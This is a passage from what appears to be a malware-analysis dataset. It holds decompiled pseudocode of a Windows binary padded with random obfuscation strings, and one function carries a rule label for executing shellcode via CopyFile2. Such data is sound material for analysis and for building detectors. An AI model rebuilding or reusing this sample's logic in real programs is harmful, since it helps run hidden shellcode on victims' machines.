piVar6[-0xe] = 0x420f5b;\n    fcn.00402f72();\n    piVar6[-4] = 0x2f3;\n    piVar6[-3] = 0x2c;\n    *(piVar6 + -2) = 0;\n    *piVar13 = 0x9a8;\n    piVar6[-0xe] = 0x420f79;\n    uVar7 = fcn.00401c80();\n    piVar6[-1] = uVar7;\n    piVar6[-0xe] = 0;\n    piVar6[-10] = 0;\n    piVar6[-9] = 0xf;\n    *(piVar6 + -0xe) = 0;\n    *(piVar6 + -0x11) = uStack36;\n    piVar6[-0x10] = \"jpanylkfimdemiqosatnihyzdvbngbvsejdqpisrkgpiaeiyqyejwpqfrgaveldmollmemkwdyg\";\n    piVar6[-0x12] = 0x4b;\n    piVar6[-0x13] = 0x420fbf;\n    fcn.00402f72();\n    piVar6[-0xf] = 0x1d7d;\n    piVar6[-8] = 0x92f;\n    *(piVar6 + -7) = 0;\n    *(piVar6 + -6) = 0;\n    iVar3 = *0x541f8c;\n    iVar10 = *0x541f88;\n    iVar11 = *0x541f84;\n    piVar6[-5] = *0x541f80;\n    piVar6[-4] = iVar11;\n    piVar6[-3] = iVar10;\n    piVar6[-2] = iVar3;\n    piVar6[-1] = 0xd9;\n    piVar6[-0x13] = 0x420feb;\n    uVar7 = fcn.00404cbe();\n    piStack40 = piVar6;\n    piVar6[-1] = uVar7;\n    piStack44 = piVar6 + -6;\n    piVar6[-6] = 0;\n    piVar6[-2] = 0;\n    piVar6[-1] = 0xf;\n    *(piVar6 + -6) = 0;\n    *(piVar6 + -0x16) = uStack36;\n    piVar6[-0x15] = \"yukygfhzbaveitqyfjszvbqpqrcmnshpqojtxshddrbyurfcsjdxgjzttjoexfwysryvupjecnmozqcsfypnjrjldaq\";\n    piVar6[-0x17] = 0x5b;\n    piVar6[-0x18] = 0x421033;\n    fcn.00402f72();\n    piVar6[-0xc] = 0;\n    piVar6[-8] = 0;\n    piVar6[-7] = 0xf;\n    piStack48 = piVar6 + -0x14;\n    *(piVar6 + -0xc) = 0;\n    uStack20 = 9;\n    *(piVar6 + -0x19) = uStack36;\n    piVar6[-0x18] = \"rpuvmqmpvrrnujmumhsmqmkduwgiitpmqimzcidqfvbtlgeponychlktolgzqlylrwemehncawudmqkzgcawgigrsrll\";\n    piVar6[-0x1a] = 0x5c;\n    piVar6[-0x1b] = 0x421077;\n    fcn.00402f72();\n    puVar4 = piStack48;\n    uVar2 = *0x541fac;\n    uVar1 = *0x541fa8;\n    uVar7 = *0x541fa4;\n    *piStack48 = *0x541fa0;\n    puVar4[1] = uVar7;\n    puVar4[2] = uVar1;\n    puVar4[3] = uVar2;\n    uVar2 = *0x541fcc;\n    uVar1 = *0x541fc8;\n    uVar7 = *0x541fc4;\n    puVar4[4] = *0x541fc0;\n    puVar4[5] = uVar7;\n    puVar4[6] = uVar1;\n    puVar4[7] = uVar2;\n    piVar6[-0x1b] = 0x421094;\n    fcn.00403e72();\n    piVar6 = piStack40;\n    uStack20 = 0xffffffff;\n    puStack196 = &stack0xffffff7c;\n    piStack40[-1] = 0;\n    piVar6[-2] = 0;\n    piVar6[-4] = 0x4210ab;\n    fcn.0040165e();\n    uVar8 = uStack112;\n    if (uStack112 < 0x10) {\ncode_r0x004210e3:\n        uStack116 = 0;\n        uStack112 = 0xf;\n        uStack132 = uStack132 & 0xffffff00;\n        piStack40 = &stack0xffffff3c;\n        piVar6[-4] = uVar8;\n        piStack48 = piVar6 + -0x19;\n        piStack44 = piVar6 + -9;\n        piVar6[-4] = 0xf;\n        piVar6[-5] = 0xc;\n        piVar6[-9] = 0x6a687077;\n        piVar6[-8] = 0x72626272;\n        piVar6[-7] = 0x6f746b74;\n        *(piVar6 + -6) = 0;\n        piVar6[-0x16] = 0;\n        piVar6[-0x12] = 0;\n        piVar6[-0x11] = 0xf;\n        *(piVar6 + -0x16) = 0;\n        uStack20 = 10;\n        *(piVar6 + -0x1b) = uStack36;\n        piVar6[-0x1a] = \"vyakaptghlfpixiebepxdmkncfkvtanrypnooixsdrcrmffgvjbidmlqcmtipb\";\n        piVar6[-0x1c] = 0x3e;\n        piVar6[-0x1d] = 0x42116f;\n        fcn.00402f72();\n        puVar4 = piStack48;\n        piStack48[1] = 0x40f0b070;\n        *puVar4 = 0;\n        puVar4[2] = 0x5e7;\n        puVar4[10] = 0x40b4d900;\n        puVar4[9] = 0;\n        puVar4[0xb] = 0xecc;\n        *(puVar4 + 0xc) = 1;\n        puVar4[0xe] = 0x40ca6980;\n        puVar4[0xd] = 0;\n        puVar4[0xf] = 0x172f;\n        piVar6[-0x1d] = 0x4211b9;\n        uVar7 = fcn.00406064();\n        piVar6 = piStack40;\n        piVar14 = piStack40 + -1;\n        piStack40[-1] = uVar7;\n        piVar6[-8] = 0;\n        piVar6[-4] = 0;\n        piVar6[-3] = 0xf;\n        *(piVar6 + -8) = 0;\n        uStack20 = 0xffffffff;\n        *(piVar6 + -0xb) = uStack36;\n        piVar6[-10] = \"mdhexbdchbbebmalmsygdcuvzjttmxcgwtshuzcxbwqbctkzwltpbgglxqcnscobezfhbauadoxfs\";\n        puStack196 = 0x4d;\n        piVar6[-0xd] = 0x421205;\n        fcn.00402f72();\n        piVar6[-9] = &stack0xffffff94;\n        *piVar14 = 0x40b88d00;\n        piVar6[-2] = 0;\n        uStack88 = 0xf;\n        uStack92 = 4;\n        uStack108 = 0x75727972;\n        uStack104 = 0;\n        uVar8 = piVar6[-3];\n        if (0xf < uVar8) {\n            iVar11 = piVar6[-8];\n            uVar9 = uVar8 + 1;\n            iVar10 = iVar11;\n            if (0xfff < uVar9) {\n                iVar10 = *(iVar11 + -4);\n                if (0x1f < (iVar11 + -4) - iVar10) goto code_r0x0042152a;\n                uVar9 = uVar8 + 0x24;\n            }\n            piVar6[-0xd] = uVar9;\n            piVar6[-0xe] = iVar10;\n            piVar6[-0xf] = 0x421266;\n            fcn.00401a32(piVar6[-0xe]);\n        }\n        if (0xf < uStack88) {\n            uVar8 = uStack88 + 1;\n            uVar9 = uStack108;\n            if (0xfff < uVar8) {\n                uVar9 = *(uStack108 - 4);\n                if (0x1f < (uStack108 - 4) - uVar9) goto code_r0x00421536;\n                uVar8 = uStack88 + 0x24;\n            }\n            piVar6[-1] = uVar8;\n            piVar6[-2] = uVar9;\n            piVar6[-3] = 0x4212a0;\n            fcn.00401a32(piVar6[-2]);\n        }\n        uStack92 = 0;\n        uStack88 = 0xf;\n        uStack108 = uStack108 & 0xffffff00;\n        piVar6[-1] = 0;\n        piVar6[-4] = 0;\n        piVar6[-8] = 0;\n        piVar6[-9] = 0x4212d4;\n        fcn.0040618b();\n        piStack48 = piVar6 + -0x15;\n        piStack44 = piVar6 + -0xe;\n        piStack40 = piVar6 + -8;\n        piVar6[-9] = 0xf;\n        piVar6[-10] = 10;\n        piVar6[-0xe] = 0x6f676f65;\n        piVar6[-0xd] = 0x6568696a;\n        *(piVar6 + -0xc) = 0x6e65;\n        *(piVar6 + -0x2e) = 0;\n        piVar6[-0x15] = 0;\n        piVar6[-0x11] = 0;\n        piVar6[-0x10] = 0xf;\n        *(piVar6 + -0x15) = 0;\n        uStack20 = 0xb;\n        *(piVar6 + -0x17) = uStack36;\n        piVar6[-0x16] =\n             \"gsvroggoaymeloaypozeqwikkpzgqandbtutfcjzqzzvgwnvgpavkfhneseevxfnqakzukevpbuedhvhijitoiitnxlsiqre\";\n        piVar6[-0x18] = 0x60;\n        piVar6[-0x19] = 0x421347;\n        fcn.00402f72();\n        *(piStack48 + 0x18) = 0;\n        uStack20 = 0xffffffff;\n        piVar6[-0x19] = 0x42135a;\n        uVar7 = fcn.00401f3c();\n        puVar4 = piStack40;\n        piStack48 = piStack40;\n        piStack40[-1] = uVar7;\n        piStack44 = puVar4 + -7;\n        puVar4[-7] = 0;\n        puVar4[-3] = 0;\n        puVar4[-2] = 0xf;\n        *(puVar4 + -7) = 0;\n        *(puVar4 + -0x1f) = uStack36;\n        puVar4[-0x1e] = \"lbgeucatvdvvlkldfejmpzynkdkxzcrczklobmockzlyndrktkdrxwqtki\";\n        puVar4[-0x20] = 0x3a;\n        puVar4[-0x21] = 0x4213a3;\n        fcn.00402f72();\n        puStack80 = puVar4 + -0xd;\n        puVar4[-0xd] = 0;\n        puVar4[-9] = 0;\n        puVar4[-8] = 0xf;\n        piStack40 = puVar4 + -0x1d;\n        *(puVar4 + -0xd) = 0;\n        uStack20 = 0xc;\n        *(puVar4 + -0x22) = uStack36;\n        puVar4[-0x21] = \"hnofpmcghvhdfqnuprmdybtursquiyalbsnbmxqqvnravhtzybbrvuotusouohtdlvt\";\n        puVar4[-0x23] = 0x43;\n        puVar4[-0x24] = 0x4213ea;\n        fcn.00402f72();\n        piVar6 = piStack40;\n        piStack76 = piStack40 + 7;\n        piStack40[7] = 0;\n        piVar6[0xb] = 0;\n        piVar6[0xc] = 0xf;\n        *(piVar6 + 7) = 0;\n        uStack20 = 0xd;\n        *(puVar4 + -0x25) = uStack36;\n        puVar4[-0x24] = \"olbeqlwfvugmtvyrxxnfsvkyzzucmvsscgvztfellaldndltkehpgguffptmduzrbvobpkimvftvivnthibdvvuuk\";\n        puVar4[-0x26] = 0x59;\n        puVar4[-0x27] = 0x421431;\n        fcn.00402f72();\n        piVar6 = piStack40;\n        piStack40[1] = 0;\n        piVar6[5] = 0;\n        piVar6[6] = 0xf;\n        *(piVar6 + 1) = 0;\n        uStack20 = 0xe;\n        *(puVar4 + -0x28) = uStack36;\n        puVar4[-0x27] = \"hswgqvccrmghgztnqzpwxkvphdvvmebzgsyeuflodqxabwybrwtkpqdtf\";\n        puVar4[-0x29] = 0x39;\n        puVar4[-0x2a] = 0x421477;\n        fcn.00402f72();\n        piVar6 = piStack40;\n        *piStack40 = &stack0xffffff64;\n        piVar6[0xd] = 0x8f3;\n        piVar6[0xf] = 0x40f1b160;\n        piVar6[0xe] = 0;\n        *(piVar6 + 0x1c) = 0;\n        uStack20 = 0xffffffff;\n        puVar4[-0x2a] = 0x4214a7;\n        fcn.00404c37();\n        puVar4 = piStack48;\n        if (0xf < uStack136) {\n            uVar8 = uStack136 + 1;\n            iVar11 = aiStack156[0];\n            if (0xfff < uVar8) {\n                iVar11 = *(aiStack156[0] + -4);\n                if (0x1f < (aiStack156[0] + -4) - iVar11) goto code_r0x00421542;\n                uVar8 = uStack136 + 0x24;\n            }\n            piStack48[-1] = uVar8;\n            puVar4[-2] = iVar11;\n            puVar4[-3] = 0x4214e4;\n            fcn.00401a32(puVar4[-2]);\n        }\n        *in_FS_OFFSET = iStack28;\n        return uStack84;\n    }\n    uVar8 = uStack112 + 1;\n    uVar9 = uStack132;\n    if (uVar8 < 0x1000) {\ncode_r0x004210d9:\n        piVar6[-4] = uVar8;\n        piVar6[-5] = uVar9;\n        piVar6[-6] = 0x4210e0;\n        uVar8 = fcn.00401a32(piVar6[-5]);\n        goto code_r0x004210e3;\n    }\n    uVar9 = *(uStack132 - 4);\n    if ((uStack132 - 4) - uVar9 < 0x20) {\n        uVar8 = uStack112 + 0x24;\n        goto code_r0x004210d9;\n    }\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042152a:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00421536:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00421542:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar7 = fcn.00403a76();\n    return uVar7;\n}\n",
        "token_count": 6249
    },
    "0042abf0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.0042abf0(int32_t param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uchar *puVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    int32_t *in_FS_OFFSET;\n    uint auStack216 [7];\n    uint uStack188;\n    uint uStack172;\n    uint uStack168;\n    int32_t iStack140;\n    uint32_t auStack136 [4];\n    uint uStack120;\n    uint32_t uStack116;\n    uint32_t uStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint *puStack56;\n    int32_t *piStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack48 = &stack0xffffff78;\n    puStack32 = &stack0xffffff78;\n    uStack24 = 0x44c3e0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack140 = param_1 + 0x24;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x34) = 0;\n    *(param_1 + 0x38) = 0xf;\n    *(param_1 + 0x24) = 0;\n    piStack40 = &stack0xffffff28;\n    puStack44 = &stack0xffffff44;\n    uStack172 = 0;\n    uStack168 = 0xf;\n    uStack188 = 0;\n    uStack20 = 3;\n    iStack64 = param_1;\n    iStack60 = iStack140;\n    fcn.00402f72(0x53);\n    puVar16 = piStack40;\n    *piStack40 = 0;\n    puVar16[4] = 0;\n    puVar16[5] = 0xf;\n    *puVar16 = 0;\n    uStack20 = 0x12;\n    fcn.00402f72(0x1f, uStack36, \"ogsrhoyozeqbdddrigasxnlyrttpfla\");\n    puVar16 = piStack40;\n    piStack40[6] = 0x10a;\n    puVar16[0xe] = 0x40c96f00;\n    puVar16[0xd] = 0;\n    uVar2 = *0x5420ec;\n    uVar1 = *0x5420e8;\n    uVar8 = *0x5420e4;\n    puVar16[0xf] = *0x5420e0;\n    puVar16[0x10] = uVar8;\n    puVar16[0x11] = uVar1;\n    puVar16[0x12] = uVar2;\n    puVar16[0x13] = 0x1be;\n    uStack20 = 3;\n    uVar8 = fcn.004010e6();\n    puVar16 = puStack48;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0x10;\n    puStack44 = puVar16 + -7;\n    puVar16[-7] = 0;\n    puVar16[-3] = 0;\n    puVar16[-2] = 0xf;\n    *(puVar16 + -7) = 0;\n    *(puVar16 + -0x12) = uStack36;\n    puVar16[-0x11] = \"tazmmynysmghxzazslwazddyhimjwzywduvzihcwmvimbrzakymbqnowsfagkdceuyfbtqidukepfxmsfidwtlullru\";\n    puVar16[-0x13] = 0x5b;\n    puVar16[-0x14] = 0x42ad4c;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[2] = 0;\n    puVar5[6] = 0;\n    puVar5[7] = 0xf;\n    *(puVar5 + 2) = 0;\n    uStack20 = 0x11;\n    *(puVar16 + -0x15) = uStack36;\n    puVar16[-0x14] = \"rnhsgglpbqnzdsopbeqylenaa\";\n    puVar16[-0x16] = 0x19;\n    puVar16[-0x17] = 0x42ad92;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0x40d8e840;\n    *puVar5 = 0;\n    *(puVar5 + 8) = 0;\n    *(puVar5 + 0xf) = 1;\n    uStack20 = 3;\n    puVar16[-0x17] = 0x42adb6;\n    uVar8 = fcn.004021bc();\n    puVar16 = puStack48;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0x18;\n    puStack44 = puVar16 + -10;\n    puVar16[-10] = 0;\n    puVar16[-6] = 0;\n    puVar16[-5] = 0xf;\n    *(puVar16 + -10) = 0;\n    *(puVar16 + -0x1a) = uStack36;\n    puVar16[-0x19] = \"pyrsbhrhzvmqftmzymgfpjrgdcwnywtywskmwmovzwbragaflhwtlbiwkqsjhrbjdkbehoabosussscienoidmngwk\";\n    puVar16[-0x1b] = 0x5a;\n    puVar16[-0x1c] = 0x42adff;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack52 = piStack40 + 8;\n    piStack40[8] = 0;\n    piVar6[0xc] = 0;\n    piVar6[0xd] = 0xf;\n    *(piVar6 + 8) = 0;\n    uStack20 = 0xf;\n    *(puVar16 + -0x1d) = uStack36;\n    puVar16[-0x1c] = \"hxrpkekufydmwegmkkypitndvwbnzhbhawobllshyzaswkzzsvvrgqyqkfuruxxhbtdwzhgewytouiyxqyiwpaanldrkgjq\";\n    puVar16[-0x1e] = 0x5f;\n    puVar16[-0x1f] = 0x42ae46;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack40[2] = 0;\n    piVar6[6] = 0;\n    piVar6[7] = 0xf;\n    *(piVar6 + 2) = 0;\n    uStack20 = 0x10;\n    *(puVar16 + -0x20) = uStack36;\n    puVar16[-0x1f] = \"wrvldhgwbwgwidzlujtnvprmspserueywwsqjqtjdiuriolpjwkhniattvzughdgpnyvvamdonzkfqdosksetyxqrii\";\n    puVar16[-0x21] = 0x5b;\n    puVar16[-0x22] = 0x42ae8c;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = &stack0xffffff78;\n    *(piVar6 + 1) = 0;\n    piVar6[0x15] = 0x40ee3e20;\n    piVar6[0x14] = 0;\n    piVar6[0x16] = 0x29f;\n    *(piVar6 + 0x17) = 1;\n    uStack20 = 3;\n    puVar16[-0x22] = 0x42aec0;\n    fcn.004022c5();\n    puVar16 = puStack48;\n    uVar9 = uStack116;\n    if (0xf < uStack116) {\n        uVar9 = uStack116 + 1;\n        uVar11 = auStack136[0];\n        if (uVar9 < 0x1000) {\ncode_r0x0042aef4:\n            puStack48[-1] = uVar9;\n            puVar16[-2] = uVar11;\n            puVar16[-3] = 0x42aefb;\n            uVar9 = fcn.00401a32(puVar16[-2]);\n            goto code_r0x0042aefe;\n        }\n        uVar11 = *(auStack136[0] - 4);\n        if ((auStack136[0] - 4) - uVar11 < 0x20) {\n            uVar9 = uStack116 + 0x24;\n            goto code_r0x0042aef4;\n        }\n        uStack20 = 0;\n        puStack48[-1] = 0x42b819;\n        fcn.004047f5();\ncode_r0x0042b819:\n        uStack20 = 1;\n        puVar16[-1] = 0x42b825;\n        fcn.004047f5();\ncode_r0x0042b825:\n        uStack20 = 2;\n        puVar16[-1] = 0x42b831;\n        fcn.004047f5();\n        puVar16[-1] = &stack0xfffffffc;\n        puVar16[-0x1f] = 0x42b84c;\n        fcn.004052d1();\n        puVar16[-0x1f] = &stack0x00000008;\n        puVar16[-0x3d] = 0x42b85c;\n        fcn.004052d1();\n        puVar16[-0x3d] = &stack0x00000014;\n        puVar16[-0x5b] = 0x42b86c;\n        fcn.004052d1();\n        puVar16[-0x5b] = &stack0x00000020;\n        puVar16[-0x79] = 0x42b87f;\n        iVar10 = fcn.00403a76();\n        return iVar10;\n    }\ncode_r0x0042aefe:\n    uStack120 = 0;\n    uStack116 = 0xf;\n    auStack136[0] = auStack136[0] & 0xffffff00;\n    puStack48 = puVar16;\n    puVar16[-1] = uVar9;\n    piStack40 = puVar16 + -0x16;\n    puStack44 = puVar16 + -6;\n    puVar16[-6] = 0;\n    puVar16[-2] = 0;\n    puVar16[-1] = 0xf;\n    *(puVar16 + -6) = 0;\n    *(puVar16 + -0x18) = uStack36;\n    puVar16[-0x17] = \"jonikdawfgfnarehstxvotwjqfipryijdfistrxqccfryoapkmpucmddoapsz\";\n    puVar16[-0x19] = 0x3d;\n    puVar16[-0x1a] = 0x42af5c;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[4] = 0;\n    puVar5[8] = 0;\n    puVar5[9] = 0xf;\n    *(puVar5 + 4) = 0;\n    uStack20 = 0xe;\n    *(puVar16 + -0x1b) = uStack36;\n    puVar16[-0x1a] = \"fkinvycryqqcxtzlwvdjoytdcuaevapqoqtcqxqnnmvzrlcoksjjsnqdey\";\n    puVar16[-0x1c] = 0x3a;\n    puVar16[-0x1d] = 0x42afa2;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    uVar2 = *0x54210c;\n    uVar1 = *0x542108;\n    uVar8 = *0x542104;\n    *piStack40 = *0x542100;\n    puVar5[1] = uVar8;\n    puVar5[2] = uVar1;\n    puVar5[3] = uVar2;\n    uVar2 = *0x54212c;\n    uVar1 = *0x542128;\n    uVar8 = *0x542124;\n    puVar5[10] = *0x542120;\n    puVar5[0xb] = uVar8;\n    puVar5[0xc] = uVar1;\n    puVar5[0xd] = uVar2;\n    puVar5[0xe] = 0x195e;\n    *(puVar5 + 0xf) = 0;\n    uStack20 = 3;\n    puVar16[-0x1d] = 0x42afd1;\n    uVar8 = fcn.004010d7();\n    puVar16 = puStack48;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0x14;\n    puStack44 = puVar16 + -7;\n    puVar16[-7] = 0;\n    puVar16[-3] = 0;\n    puVar16[-2] = 0xf;\n    *(puVar16 + -7) = 0;\n    *(puVar16 + -0x16) = uStack36;\n    puVar16[-0x15] = \"bibcuzdiljuztimksbcrsafexicbio\";\n    puVar16[-0x17] = 0x1e;\n    puVar16[-0x18] = 0x42b01a;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[1] = 0;\n    puVar5[5] = 0;\n    puVar5[6] = 0xf;\n    *(puVar5 + 1) = 0;\n    uStack20 = 0xd;\n    *(puVar16 + -0x19) = uStack36;\n    puVar16[-0x18] = \"vfkvyjidgyxnxjcgxhyxbwgevvwigrayrxezrmhblksrlvzfctzzrs\";\n    puVar16[-0x1a] = 0x36;\n    puVar16[-0x1b] = 0x42b060;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0x1b88;\n    *(puVar5 + 7) = 1;\n    uVar2 = *0x54214c;\n    uVar1 = *0x542148;\n    uVar8 = *0x542144;\n    puVar5[8] = *0x542140;\n    puVar5[9] = uVar8;\n    puVar5[10] = uVar1;\n    puVar5[0xb] = uVar2;\n    *(puVar5 + 0xc) = 0;\n    *(puVar5 + 0x13) = 1;\n    uStack20 = 3;\n    puVar16[-0x1b] = 0x42b08c;\n    uVar8 = fcn.0040557e();\n    puVar16 = puStack48;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0x12;\n    puVar16[-9] = 0;\n    puVar16[-5] = 0;\n    puVar16[-4] = 0xf;\n    *(puVar16 + -9) = 0;\n    *(puVar16 + -0x14) = uStack36;\n    puVar16[-0x13] = \"ptiuwpbkzmhwtagbggwokfnfftbhjgxkhbwtbdmnfzalttmlbwtdkngcpihekkhnbpekhgmqbrsfywgkyvjgkszqhiirgnp\";\n    puVar16[-0x15] = 0x5f;\n    puVar16[-0x16] = 0x42b0d2;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = 1;\n    piVar6[1] = 0x1b20;\n    *(piVar6 + 2) = 1;\n    piVar6[4] = 0x40e31aa0;\n    piVar6[3] = 0;\n    *(piVar6 + 5) = 1;\n    *(piVar6 + 6) = 0;\n    piVar6[8] = 0x40a5f600;\n    piVar6[7] = 0;\n    piVar6[0xf] = 0x77c;\n    piVar6[0x11] = 0x40bea700;\n    piVar6[0x10] = 0;\n    puVar16[-0x16] = 0x42b121;\n    fcn.0040545c();\n    puVar5 = puStack48;\n    puVar16 = puStack48 + -2;\n    puVar12 = puStack48 + -2;\n    puStack48[-2] = &stack0xffffff90;\n    puVar5[-3] = 0x42b130;\n    fcn.004048e0();\n    if (0xf < uStack92) {\n        uVar9 = uStack92 + 1;\n        uVar11 = uStack112;\n        if (0xfff < uVar9) {\n            uVar11 = *(uStack112 - 4);\n            if (0x1f < (uStack112 - 4) - uVar11) goto code_r0x0042b819;\n            uVar9 = uStack92 + 0x24;\n        }\n        puVar5[-3] = uVar9;\n        puVar5[-4] = uVar11;\n        puVar5[-5] = 0x42b165;\n        fcn.00401a32(puVar5[-4]);\n    }\n    uStack96 = 0;\n    uStack92 = 0xf;\n    uStack112 = uStack112 & 0xffffff00;\n    puVar5[-3] = 0x42b17f;\n    fcn.0040205e();\n    piStack40 = puVar12;\n    puVar5[-3] = 0xf;\n    puVar5[-4] = 8;\n    puVar5[-7] = 0x61786964;\n    puVar5[-8] = 0x776d666f;\n    *(puVar5 + -6) = 0;\n    puVar5[-9] = 0x21;\n    puVar5[-10] = 0x42b1b2;\n    uVar8 = fcn.004068b1();\n    puVar5 = piStack40;\n    puStack48 = piStack40;\n    piStack40[-1] = uVar8;\n    puStack44 = piStack40 + -6;\n    piStack40[-6] = 0;\n    piStack40[-2] = 0;\n    piStack40[-1] = 0xf;\n    puVar16 = piStack40 + -6;\n    piStack40 = piStack40 + -0x15;\n    *puVar16 = 0;\n    *(puVar5 + -0x17) = uStack36;\n    puVar5[-0x16] = \"vvhpjoudtlcuarsg\";\n    puVar5[-0x18] = 0x10;\n    puVar5[-0x19] = 0x42b1fe;\n    fcn.00402f72();\n    puVar16 = piStack40;\n    piStack52 = piStack40 + 8;\n    piStack40[8] = 0;\n    puVar16[0xc] = 0;\n    puVar16[0xd] = 0xf;\n    *(puVar16 + 8) = 0;\n    uStack20 = 0xb;\n    *(puVar5 + -0x1a) = uStack36;\n    puVar5[-0x19] =\n         \"wiprxvapyznuolxyvwrdecjxaslqmfnrywavajkfitbdcxlkiqjygrjlokjdxewbkwtcdaghqfneslstvkyxlvzubuianwginagl\";\n    puVar5[-0x1b] = 100;\n    puVar5[-0x1c] = 0x42b245;\n    fcn.00402f72();\n    puVar16 = piStack40;\n    piStack40[1] = 0;\n    puVar16[5] = 0;\n    puVar16[6] = 0xf;\n    *(puVar16 + 1) = 0;\n    uStack20 = 0xc;\n    *(puVar5 + -0x1d) = uStack36;\n    puVar5[-0x1c] = \"fgscxcqyrzpwvepypwetmlzgevthjalvkcyvqmsvmpmzxruzhgjcwjljgvsazfkewknidcpg\";\n    puVar5[-0x1e] = 0x48;\n    puVar5[-0x1f] = 0x42b28b;\n    fcn.00402f72();\n    puVar16 = piStack40;\n    *piStack40 = 0x7a8;\n    puVar16[7] = 0x188;\n    puVar16[0xe] = 0x318;\n    puVar5[-0x1f] = 0x42b2a7;\n    uVar8 = fcn.0040671c();\n    puVar16 = puStack48;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0x1d;\n    puStack44 = puVar16 + -8;\n    puVar16[-8] = 0;\n    puVar16[-4] = 0;\n    puVar16[-3] = 0xf;\n    *(puVar16 + -8) = 0;\n    uStack20 = 3;\n    *(puVar16 + -0x1f) = uStack36;\n    puVar16[-0x1e] = \"voohkxjdubhpkeuqihnhfulpvsnfzvnxtkpbxxrxxpcfainmukbuquqvopqmlbrh\";\n    puVar16[-0x20] = 0x40;\n    puVar16[-0x21] = 0x42b2f7;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack52 = piStack40 + 0xf;\n    piStack40[0xf] = 0;\n    puVar5[0x13] = 0;\n    puVar5[0x14] = 0xf;\n    *(puVar5 + 0xf) = 0;\n    uStack20 = 9;\n    *(puVar16 + -0x22) = uStack36;\n    puVar16[-0x21] = \"qkoytqayryikgcalhaknjeszhgdakjdopkquxsjpbtbnku\";\n    puVar16[-0x23] = 0x2e;\n    puVar16[-0x24] = 0x42b33e;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    puStack56 = piStack40 + 8;\n    piStack40[0xd] = 0xf;\n    puVar5[0xc] = 10;\n    *(puVar5 + 10) = 0x6e68;\n    *(puVar5 + 0x2a) = 0;\n    puVar5[2] = 0;\n    uVar2 = str.grmhabxh._4_4_;\n    uVar1 = str.grmhabxh._0_4_;\n    uVar8 = *0x542164;\n    puVar5[6] = *0x542160;\n    puVar5[7] = uVar8;\n    puVar5[8] = uVar1;\n    puVar5[9] = uVar2;\n    *(puVar5 + 2) = 0;\n    uStack20 = 10;\n    *(puVar16 + -0x25) = uStack36;\n    puVar16[-0x24] = \"gdzwksfgzdkwsrncdlgpmputztilmremhiwmfhxxbqgntj\";\n    puVar16[-0x26] = 0x2e;\n    puVar16[-0x27] = 0x42b39f;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0x1836;\n    puVar5[1] = 0x350;\n    *(puVar5 + 0xe) = 1;\n    puVar5[0x1c] = 0x40c6ee00;\n    puVar5[0x1b] = 0;\n    uStack20 = 3;\n    puVar16[-0x27] = 0x42b3cd;\n    uVar8 = fcn.00403a2b();\n    puVar16 = puStack48;\n    puVar13 = puStack48 + -1;\n    puStack48[-1] = uVar8;\n    piStack40 = puVar16 + -0x13;\n    puStack44 = puVar16 + -6;\n    puVar16[-6] = 0;\n    puVar16[-2] = 0;\n    *puVar13 = 0xf;\n    *(puVar16 + -6) = 0;\n    *(puVar16 + -0x15) = uStack36;\n    puVar16[-0x14] = \"wtrjngpviwtdcgukbwoikjcanamcrnwxpksufmbvjbqigifmommjshd\";\n    puVar16[-0x16] = 0x37;\n    puVar16[-0x17] = 0x42b416;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    piStack40[6] = 0;\n    puVar5[10] = 0;\n    puVar5[0xb] = 0xf;\n    *(puVar5 + 6) = 0;\n    uStack20 = 8;\n    *(puVar16 + -0x18) = uStack36;\n    puVar16[-0x17] = \"blnntfbcyreklnhzfmrpipkshdd\";\n    puVar16[-0x19] = 0x1b;\n    puVar16[-0x1a] = 0x42b45c;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    uVar2 = *0x54218c;\n    uVar1 = *0x542188;\n    uVar8 = *0x542184;\n    *piStack40 = *0x542180;\n    puVar5[1] = uVar8;\n    puVar5[2] = uVar1;\n    puVar5[3] = uVar2;\n    puVar5[5] = 0x40f0fe40;\n    puVar5[4] = 0;\n    